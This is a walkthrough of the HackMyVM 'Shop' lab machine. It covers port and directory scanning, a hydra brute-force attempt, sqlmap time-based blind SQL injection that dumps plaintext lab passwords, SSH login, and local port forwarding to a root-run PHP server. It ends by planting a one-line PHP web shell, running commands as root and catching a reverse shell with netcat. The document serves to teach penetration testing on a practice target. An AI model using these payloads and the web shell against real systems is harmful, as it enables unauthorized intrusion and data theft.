@@ -1,0 +1,291 @@
+---
+title: "Shop - HackMyVM Walkthrough"
+---
+Difficulty: Easy
+
+nmap service scan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ nmap -p- -sV 192.168.56.254
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 19:32 EDT
+Nmap scan report for 192.168.56.254
+Host is up (0.00037s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+65535/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+
+gobuster on files and directories: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -q -x php,txt,html,dic -u http://192.168.56.254
+/index.html           (Status: 200) [Size: 21300]
+/shop                 (Status: 301) [Size: 315] [--> http://192.168.56.254/shop/]
+{% endhighlight %}
+
+dirb output:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ dirb http://192.168.56.254
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Nov  6 19:39:24 2021
+URL_BASE: http://192.168.56.254/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.56.254/ ----
++ http://192.168.56.254/index.html (CODE:200|SIZE:21300)                           
++ http://192.168.56.254/server-status (CODE:403|SIZE:279)                          
+==> DIRECTORY: http://192.168.56.254/shop/                                         
+                                                                                   
+---- Entering directory: http://192.168.56.254/shop/ ----
+==> DIRECTORY: http://192.168.56.254/shop/administrator/                           
+==> DIRECTORY: http://192.168.56.254/shop/css/                                     
+==> DIRECTORY: http://192.168.56.254/shop/fonts/                                   
++ http://192.168.56.254/shop/index.html (CODE:200|SIZE:3520)                       
+==> DIRECTORY: http://192.168.56.254/shop/js/                                      
+                                                                                   
+---- Entering directory: http://192.168.56.254/shop/administrator/ ----
++ http://192.168.56.254/shop/administrator/index.php (CODE:200|SIZE:514)
+{% endhighlight %}
+
+drilling down to the administrator directory:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -q -x php,txt,html,dic -u http://192.168.56.254/shop/administrator
+/index.php            (Status: 200) [Size: 514]
+/login.php            (Status: 200) [Size: 0]  
+/profile.php          (Status: 302) [Size: 216] [--> index.php]
+/logout.php           (Status: 302) [Size: 0] [--> index.php]
+{% endhighlight %}
+
+Using hydra to try and bruteforce the login form:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.254 http-post-form "/shop/administrator/index.php:username=^USER^&password=^PASS^&submit=+Login+:Username or Password is invalid" -vV
+{% endhighlight %}
+
+I let this run for around 59000 attempts with no luck. Moving on. 
+Maybe the login form is vulnerable to SQL injection. I used sqlmap to see if any of
+the form fields are vulnerable: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ sqlmap -u http://192.168.56.254/shop/administrator/ --forms
+--SNIP--
+[16:20:03] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+--SNIP--
+POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
+---
+Parameter: password (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=OpQn&password=' AND (SELECT 8266 FROM (SELECT(SLEEP(5)))NQpB) AND 'lNAB'='lNAB&submit= Login
+--SNIP--
+{% endhighlight %}
+
+The password field is vulnerable. 
+Getting the available databases:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ sqlmap -u http://192.168.56.254/shop/administrator/ --forms --tables
+--SNIP--
+[16:26:02] [INFO] retrieved: Webapp
+[16:26:23] [INFO] retrieved: mysql
+[16:26:39] [INFO] retrieved: performance_schema
+[16:27:36] [INFO] fetching tables for databases: 'Webapp, information_schema, mysql, performance_schema'
+--SNIP--
+{% endhighlight %}
+
+We'll probably want to enumerate the `Webapp` database tables based on the output, 
+so let's cut this session short, declare the database with the `-D` switch and dump
+the tables in the `Webapp` database:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ sqlmap -u http://192.168.56.254/shop/administrator/ --forms -D Webapp --tables
+--SNIP--
+Users
+Database: Webapp
+[1 table]
++-------+
+| Users |
++-------+
+{% endhighlight %}
+
+Declaring the table to dump with the `-T` switch: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ sqlmap -u http://192.168.56.254/shop/administrator/ --forms -D Webapp -T Users --dump
+--SNIP--
+Database: Webapp
+Table: Users
+[4 entries]
++----+---------------+----------+
+| id | password      | username |
++----+---------------+----------+
+| 1  | t0m123456     | tom      |
+| 2  | p0k3m0n123456 | pokemon  |
+| 3  | B4rT0L0123    | bart     |
+| 4  | B4tm4n123456  | batman   |
++----+---------------+----------+
+--SNIP--
+{% endhighlight %}
+
+Passwords stored in plaintext. I tried each login to see if any user had access to
+other website functionality but they all have the same privileges in the admin 
+section of the website. 
+
+I tried each set of credentials over SSH and got access as the `bart` user:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ ssh bart@192.168.56.254 -p65535                                           130 ⨯
+bart@192.168.56.254's password: 
+Linux Shop 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+bart@Shop:~$
+{% endhighlight %}
+
+We get the user flag. 
+
+### Local Enumeration & Privilege Escalation
+
+SUID bins: 
+{% highlight terminal %}
+bart@Shop:~$ find / -perm -u=s -type f 2>/dev/null 
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+{% endhighlight %}
+
+Nothing really jumps out from this list. 
+SGID bins:
+{% highlight terminal %}
+bart@Shop:~$ find / -perm -g=s -type f 2>/dev/null 
+/usr/sbin/unix_chkpwd
+/usr/bin/wall
+/usr/bin/crontab
+/usr/bin/bsd-write
+/usr/bin/ssh-agent
+/usr/bin/expiry
+/usr/bin/dotlockfile
+/usr/bin/chage
+{% endhighlight %}
+
+Again, nothing of note. `sudo` isn't installed either.
+
+Kernel version:
+{% highlight terminal %}
+bart@Shop:~$ uname -a
+Linux Shop 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+{% endhighlight %}
+
+Searchsploit results:
+{% highlight text %}
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SY | linux/local/47164.sh
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SY | linux/local/47165.sh
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SY | linux/local/47166.sh
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SY | linux/local/47167.sh
+{% endhighlight %}
+
+These exploits and they require a specific toolchain in order to work so no luck 
+there. 
+
+Let's get `linpeas.sh` onto the machine and use it to enumerate any and all ways of 
+escalating privileges. After downloading the script on my kali machine, I ran 
+python -m SimpleHTTPServer and used wget to get it onto the victim machine. 
+
+Running linpeas.sh didn't reveal very much. 
+
+After taking a look at a walkthrough for a hint, it suggested that we take a look atthe sockets statistics with `ss`: 
+{% highlight terminal %}
+bart@Shop:~$ ss -ltun 
+Netid   State    Recv-Q   Send-Q      Local Address:Port        Peer Address:Port   
+udp     UNCONN   0        0                 0.0.0.0:68               0.0.0.0:*      
+tcp     LISTEN   0        80              127.0.0.1:3306             0.0.0.0:*      
+tcp     LISTEN   0        128               0.0.0.0:65535            0.0.0.0:*      
+tcp     LISTEN   0        128             127.0.0.1:65000            0.0.0.0:*      
+tcp     LISTEN   0        128                     *:80                     *:*      
+tcp     LISTEN   0        128                  [::]:65535               [::]:*  
+{% endhighlight %}
+
+Here we see that the machine is listening for connections on port 65000. We need to
+identify what service or process is listening on the port:
+{% highlight terminal %}
+bart@Shop:~$ ps aux | grep '65000'
+root       721  0.0  2.2 200720 22768 ?        S    00:30   0:00 php -S 127.0.0.1:65000 -t /dev/shm/
+bart     25668  0.0  0.0   6088   896 pts/0    S+   02:49   0:00 grep 65000
+{% endhighlight %}
+
+Here we can see that php is listening on port 65000 and the document root is 
+`/dev/shm` 
+
+### Local Port Forwarding
+
+Here we will use local port forwarding to access the `/dev/shm` document root. 
+
+Setting up port forwarding with ssh:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ ssh -L 65000:127.0.0.1:65000 bart@192.168.56.254 -p65535
+bart@192.168.56.254's password: 
+Linux Shop 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+bart@Shop:~$ 
+{% endhighlight %}
+
+Now that we've got a tunnel set up, let's double check that it's up:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ lsof -i:65000                             
+COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
+ssh     139187 kali    4u  IPv6 6671521      0t0  TCP localhost:65000 (LISTEN)
+ssh     139187 kali    5u  IPv4 6671522      0t0  TCP localhost:65000 (LISTEN)
+{% endhighlight %}
+
+Let's create a web shell with the following php code:
+{% highlight terminal %}
+bart@Shop:~$ echo -n "<?php system(\$_GET['cmd']); ?>" > /dev/shm/cmd.php
+{% endhighlight %}
+
+From here we can use curl to execute system commands in the URL:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ curl http://localhost:65000/cmd.php?cmd=id
+uid=0(root) gid=0(root) grupos=0(root)
+{% endhighlight %}
+leveraging this RCE to get a tcp reverse shell with URL encoded commands didn't work
+so I chose to paste in the pentestmonkey php reverse shell code to file called
+reverse-shell.php in the `/dev/shm` directory. 
+
+Setting up a listener and catching the connection:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/shop]
+└─$ nc -nlvp 6666
+listening on [any] 6666 ...
+connect to [192.168.56.224] from (UNKNOWN) [192.168.56.254] 46270
+Linux Shop 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+ 03:45:42 up  3:15,  1 user,  load average: 0,00, 0,00, 0,00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+bart     pts/0    192.168.56.224   03:19   45.00s  0.15s  0.15s -bash
+uid=0(root) gid=0(root) grupos=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+{% endhighlight %}
+
+From here I got the root flag and submitted it for the points. Hooray for points. 
+
